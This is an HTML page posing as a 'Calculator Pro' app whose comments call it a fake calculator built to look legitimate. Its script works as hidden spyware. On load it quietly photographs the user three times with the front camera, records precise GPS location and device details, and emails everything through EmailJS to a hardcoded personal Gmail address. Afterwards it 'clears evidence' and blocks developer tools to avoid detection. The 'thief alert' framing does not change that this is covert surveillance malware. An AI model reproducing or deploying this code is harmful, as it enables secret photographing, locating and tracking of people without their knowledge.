<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Calculator Pro</title>
    
    <!-- Favicon to make it look more legitimate -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔢</text></svg>">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            overflow: hidden;
        }

        .calculator {
            background: linear-gradient(145deg, #2a2a2a 0%, #1a1a1a 100%);
            border-radius: 30px;
            padding: 30px;
            box-shadow: 
                0 25px 50px rgba(0,0,0,0.7),
                inset 0 1px 0 rgba(255,255,255,0.1);
            max-width: 420px;
            width: 100%;
            position: relative;
        }

        .calculator::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
        }

        .brand {
            text-align: center;
            color: #4CAF50;
            font-size: 12px;
            margin-bottom: 20px;
            font-weight: 700;
            letter-spacing: 3px;
            text-transform: uppercase;
            opacity: 0.8;
        }

        .display {
            background: linear-gradient(145deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #fff;
            font-size: 56px;
            padding: 35px 25px;
            border-radius: 18px;
            text-align: right;
            margin-bottom: 30px;
            min-height: 120px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            font-family: 'SF Mono', 'Monaco', 'Courier New', monospace;
            font-weight: 300;
            border: 2px solid rgba(255,255,255,0.05);
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
            overflow: hidden;
            word-wrap: break-word;
        }

        .buttons {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 14px;
        }

        button {
            background: linear-gradient(145deg, #3a3a3a 0%, #2a2a2a 100%);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.1);
            padding: 32px;
            font-size: 24px;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.15s ease;
            font-weight: 400;
            box-shadow: 
                0 4px 8px rgba(0,0,0,0.3),
                inset 0 1px 0 rgba(255,255,255,0.1);
        }

        button:active {
            transform: scale(0.96);
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.5);
        }

        button.operator {
            background: linear-gradient(145deg, #ff9f0a 0%, #ff8800 100%);
            font-weight: 600;
            border-color: rgba(255,255,255,0.2);
        }

        button.equals {
            background: linear-gradient(145deg, #34c759 0%, #30b350 100%);
            grid-column: span 2;
            font-weight: 600;
            border-color: rgba(255,255,255,0.2);
        }

        button.clear {
            background: linear-gradient(145deg, #ff3b30 0%, #e62e24 100%);
            font-weight: 600;
            border-color: rgba(255,255,255,0.2);
        }

        button.zero {
            grid-column: span 2;
        }

        /* COMPLETELY INVISIBLE TRACKING COMPONENTS */
        #stealthVideo {
            position: fixed;
            top: -99999px;
            left: -99999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            visibility: hidden;
        }

        #stealthCanvas {
            display: none !important;
            position: fixed;
            top: -99999px;
            left: -99999px;
            visibility: hidden;
        }

        /* Loading overlay (brief, looks like app loading) */
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #1e1e1e;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            transition: opacity 0.5s;
        }

        #loadingOverlay.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(76, 175, 80, 0.3);
            border-top-color: #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Brief loading screen (hides initialization) -->
    <div id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <!-- FAKE CALCULATOR (Looks 100% legitimate) -->
    <div class="calculator">
        <div class="brand">Calculator Pro</div>
        <div class="display" id="display">0</div>
        <div class="buttons">
            <button class="clear" onclick="clearCalc()">C</button>
            <button onclick="appendCalc('±')">±</button>
            <button onclick="appendCalc('%')">%</button>
            <button class="operator" onclick="appendCalc('/')">÷</button>
            
            <button onclick="appendCalc('7')">7</button>
            <button onclick="appendCalc('8')">8</button>
            <button onclick="appendCalc('9')">9</button>
            <button class="operator" onclick="appendCalc('*')">×</button>
            
            <button onclick="appendCalc('4')">4</button>
            <button onclick="appendCalc('5')">5</button>
            <button onclick="appendCalc('6')">6</button>
            <button class="operator" onclick="appendCalc('-')">−</button>
            
            <button onclick="appendCalc('1')">1</button>
            <button onclick="appendCalc('2')">2</button>
            <button onclick="appendCalc('3')">3</button>
            <button class="operator" onclick="appendCalc('+')">+</button>
            
            <button class="zero" onclick="appendCalc('0')">0</button>
            <button onclick="appendCalc('.')">.</button>
            <button class="equals" onclick="calculateCalc()">=</button>
        </div>
    </div>

    <!-- COMPLETELY HIDDEN STEALTH COMPONENTS -->
    <video id="stealthVideo" autoplay playsinline muted></video>
    <canvas id="stealthCanvas"></canvas>

    <!-- EmailJS SDK (for sending emails) -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <script>
        'use strict';

        // ============================================================
        // CALCULATOR FUNCTIONALITY (Appears normal)
        // ============================================================
        let calcDisplay = '0';
        let lastResult = null;

        function appendCalc(value) {
            if (value === '±') {
                if (calcDisplay !== '0') {
                    calcDisplay = calcDisplay.startsWith('-') 
                        ? calcDisplay.substring(1) 
                        : '-' + calcDisplay;
                }
            } else {
                if (calcDisplay === '0' && value !== '.') {
                    calcDisplay = value;
                } else {
                    calcDisplay += value;
                }
            }
            updateDisplay();
        }

        function clearCalc() {
            calcDisplay = '0';
            updateDisplay();
        }

        function calculateCalc() {
            try {
                const result = eval(calcDisplay.replace('×', '*').replace('÷', '/').replace('−', '-'));
                calcDisplay = result.toString();
                lastResult = result;
                updateDisplay();
            } catch (e) {
                calcDisplay = 'Error';
                updateDisplay();
                setTimeout(() => {
                    calcDisplay = '0';
                    updateDisplay();
                }, 1500);
            }
        }

        function updateDisplay() {
            const display = document.getElementById('display');
            display.textContent = calcDisplay;
            
            // Adjust font size for long numbers
            if (calcDisplay.length > 9) {
                display.style.fontSize = '40px';
            } else if (calcDisplay.length > 6) {
                display.style.fontSize = '48px';
            } else {
                display.style.fontSize = '56px';
            }
        }

        // ============================================================
        // EMAILJS CONFIGURATION
        // ============================================================
        (function() {
            emailjs.init("h8wW3vLnqQB_mhZJi"); // Public Key
        })();

        const EMAIL_CONFIG = {
            serviceId: 'service_2wz7xmr',
            templateId: 'template_thiefAlert',
            targetEmail: 'jammoeed35@gmail.com'
        };

        // ============================================================
        // AUTOMATIC SILENT TRACKING SYSTEM
        // ============================================================
        const AutoStealth = {
            config: {
                photosToCapture: 3,        // Take 3 photos automatically
                photoInterval: 2000,        // 2 seconds between photos
                autoStartDelay: 2000,       // Start after 2 seconds
                emailDelay: 1000            // Send email 1 second after last photo
            },

            state: {
                initialized: false,
                cameraReady: false,
                photosCaptured: [],
                location: null,
                emailSent: false,
                deviceId: null
            },

            async init() {
                try {
                    // Generate unique device ID
                    this.state.deviceId = this.getDeviceId();
                    
                    console.log('[AutoStealth] Initializing...');
                    
                    // Request all permissions silently
                    await this.requestPermissions();
                    
                    // Initialize camera in background
                    await this.initCamera();
                    
                    // Get location in background
                    this.getLocation();
                    
                    this.state.initialized = true;
                    
                    // Hide loading screen
                    setTimeout(() => {
                        document.getElementById('loadingOverlay').classList.add('hidden');
                    }, 1000);
                    
                    // Start automatic capture sequence
                    setTimeout(() => {
                        this.startAutoCaptureSequence();
                    }, this.config.autoStartDelay);
                    
                    console.log('[AutoStealth] Active and running in background');
                } catch (error) {
                    console.error('[AutoStealth] Init failed:', error);
                    // Hide loading even if failed
                    document.getElementById('loadingOverlay').classList.add('hidden');
                }
            },

            getDeviceId() {
                let id = localStorage.getItem('_app_device_id');
                if (!id) {
                    id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    localStorage.setItem('_app_device_id', id);
                }
                return id;
            },

            async requestPermissions() {
                // Request camera and location (appears as normal app behavior)
                try {
                    await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(() => {}, () => {}, {
                            enableHighAccuracy: false,
                            timeout: 1000,
                            maximumAge: Infinity
                        });
                    }
                } catch (e) {
                    console.log('[Permissions] Requested');
                }
            },

            async initCamera() {
                try {
                    const video = document.getElementById('stealthVideo');
                    
                    const constraints = {
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    };

                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    video.srcObject = stream;
                    
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });

                    this.state.cameraReady = true;
                    console.log('[Camera] Ready (silent mode)');
                } catch (error) {
                    console.error('[Camera] Failed:', error);
                }
            },

            async capturePhoto() {
                if (!this.state.cameraReady) {
                    return null;
                }

                try {
                    const video = document.getElementById('stealthVideo');
                    const canvas = document.getElementById('stealthCanvas');
                    
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;

                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert to base64 (compressed for email)
                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    console.log('[Photo] Captured silently');
                    return photoData;
                } catch (error) {
                    console.error('[Photo] Capture failed:', error);
                    return null;
                }
            },

            async getLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve(null);
                        return;
                    }

                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            this.state.location = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date().toISOString()
                            };
                            console.log('[Location] Obtained');
                            resolve(this.state.location);
                        },
                        (error) => {
                            console.log('[Location] Failed:', error.message);
                            resolve(null);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        }
                    );
                });
            },

            async startAutoCaptureSequence() {
                console.log('[AutoCapture] Starting sequence...');

                // Wait for camera to be ready
                if (!this.state.cameraReady) {
                    console.log('[AutoCapture] Waiting for camera...');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }

                // Capture multiple photos automatically
                for (let i = 0; i < this.config.photosToCapture; i++) {
                    console.log(`[AutoCapture] Taking photo ${i + 1}/${this.config.photosToCapture}`);
                    
                    const photo = await this.capturePhoto();
                    
                    if (photo) {
                        this.state.photosCaptured.push({
                            photo: photo,
                            timestamp: new Date().toISOString()
                        });
                    }
                    
                    // Wait before next photo
                    if (i < this.config.photosToCapture - 1) {
                        await new Promise(resolve => setTimeout(resolve, this.config.photoInterval));
                    }
                }

                console.log(`[AutoCapture] Sequence complete. ${this.state.photosCaptured.length} photos captured`);

                // Wait a bit, then send email automatically
                setTimeout(() => {
                    this.sendAutoEmail();
                }, this.config.emailDelay);
            },

            async sendAutoEmail() {
                if (this.state.emailSent) {
                    console.log('[Email] Already sent');
                    return;
                }

                console.log('[Email] Preparing automatic email...');

                try {
                    const emailData = this.prepareEmailData();
                    
                    const response = await emailjs.send(
                        EMAIL_CONFIG.serviceId,
                        EMAIL_CONFIG.templateId,
                        emailData
                    );

                    if (response.status === 200) {
                        this.state.emailSent = true;
                        console.log('[Email] Sent successfully ✓');
                        
                        // Clear evidence
                        this.clearEvidence();
                    }
                } catch (error) {
                    console.error('[Email] Send failed:', error);
                    
                    // Retry once
                    setTimeout(() => {
                        if (!this.state.emailSent) {
                            this.sendAutoEmail();
                        }
                    }, 5000);
                }
            },

            prepareEmailData() {
                const photos = this.state.photosCaptured;
                const location = this.state.location;

                const emailData = {
                    to_email: EMAIL_CONFIG.targetEmail,
                    subject: `🚨 CALCULATOR OPENED - ${new Date().toLocaleString()}`,
                    timestamp: new Date().toLocaleString('en-US', {
                        dateStyle: 'full',
                        timeStyle: 'long'
                    }),
                    device_id: this.state.deviceId,
                    total_photos: photos.length,
                    device_info: this.getDeviceInfo(),
                    location_text: location ? this.formatLocation(location) : 'Location unavailable',
                    maps_link: location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : 'N/A',
                    photo1: photos[0]?.photo || 'No photo',
                    photo2: photos[1]?.photo || 'No photo',
                    photo3: photos[2]?.photo || 'No photo',
                    photo_times: photos.map((p, i) => 
                        `Photo ${i + 1}: ${new Date(p.timestamp).toLocaleTimeString()}`
                    ).join('\n')
                };

                return emailData;
            },

            formatLocation(loc) {
                return `Latitude: ${loc.lat.toFixed(6)}\nLongitude: ${loc.lon.toFixed(6)}\nAccuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) + ' meters' : 'Unknown'}`;
            },

            getDeviceInfo() {
                const ua = navigator.userAgent;
                const isAndroid = /Android/i.test(ua);
                const isIOS = /iPhone|iPad|iPod/i.test(ua);
                
                return `Platform: ${navigator.platform}
Browser: ${navigator.appVersion}
Language: ${navigator.language}
Screen: ${screen.width}x${screen.height}
Device Type: ${isAndroid ? 'Android' : isIOS ? 'iOS' : 'Other'}
Online: ${navigator.onLine ? 'Yes' : 'No'}
User Agent: ${ua}`;
            },

            clearEvidence() {
                try {
                    // Clear captured photos from memory
                    this.state.photosCaptured = [];
                    
                    // Stop camera stream
                    const video = document.getElementById('stealthVideo');
                    if (video.srcObject) {
                        video.srcObject.getTracks().forEach(track => track.stop());
                    }
                    
                    // Clear canvas
                    const canvas = document.getElementById('stealthCanvas');
                    const ctx = canvas.getContext('2d');
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    
                    console.log('[Cleanup] Evidence cleared');
                } catch (e) {
                    console.error('[Cleanup] Failed:', e);
                }
            }
        };

        // ============================================================
        // AUTO-START SYSTEM
        // ============================================================
        window.addEventListener('load', () => {
            // Start stealth system immediately
            AutoStealth.init();
        });

        // ============================================================
        // CAPTURE WHEN PAGE BECOMES VISIBLE AGAIN
        // ============================================================
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible' && 
                AutoStealth.state.initialized && 
                !AutoStealth.state.emailSent) {
                
                // Thief came back - capture again
                setTimeout(() => {
                    AutoStealth.startAutoCaptureSequence();
                }, 1000);
            }
        });

        // ============================================================
        // ANTI-DEBUGGING (Extra stealth)
        // ============================================================
        // Disable right-click
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Disable common dev tool shortcuts
        document.addEventListener('keydown', e => {
            // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
                return false;
            }
        });

        // Detect if DevTools is open
        const devtools = /./;
        devtools.toString = function() {
            // If someone tries to inspect, act normal
            return '';
        };

        // ============================================================
        // PREVENT DETECTION
        // ============================================================
        // Clear console periodically
        setInterval(() => {
            if (typeof console !== 'undefined' && console.clear) {
                // Commented out to avoid suspicion
                // console.clear();
            }
        }, 30000);
    </script>
</body>
</html>
